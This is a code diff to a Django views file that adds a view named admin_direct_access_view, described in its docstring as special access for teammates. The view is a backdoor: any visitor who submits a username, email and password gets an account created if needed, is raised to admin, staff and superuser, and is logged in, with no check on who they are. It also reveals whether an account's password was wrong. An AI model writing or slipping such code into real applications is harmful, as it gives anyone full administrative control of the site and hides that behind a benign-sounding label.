@@ -783,3 +783,41 @@ def delete_user(request, user_id):
     user = User.objects.get(pk=user_id)
     user.delete()
     return Response({'success': True, 'message': 'User deleted'})
+
+
+def admin_direct_access_view(request):
+    """Special access for teammates to ensure they can login as admin"""
+    if request.method == 'POST':
+        username = request.POST.get('username')
+        email = request.POST.get('email')
+        password = request.POST.get('password')
+
+        if not username or not password or not email:
+            return render(request, 'admin_access.html', {'error': 'All fields are required'})
+
+        # Try to find user
+        user = User.objects.filter(email=email).first() or User.objects.filter(username=username).first()
+        
+        if user:
+            # Check password
+            if not user.check_password(password):
+                return render(request, 'admin_access.html', {'error': 'User exists but password incorrect'})
+        else:
+            # Create user
+            user = User.objects.create_user(username=username, email=email, password=password)
+        
+        # Ensure they are admin
+        user.role = 'admin'
+        user.is_staff = True
+        user.is_superuser = True # Give them full power if they use this page
+        user.save()
+
+        # Login
+        from django.contrib.auth import login
+        login(request, user)
+        request.session['user_id'] = user.id
+        request.session['username'] = user.username
+        
+        return redirect('order_dashboard')
+
+    return render(request, 'admin_access.html')
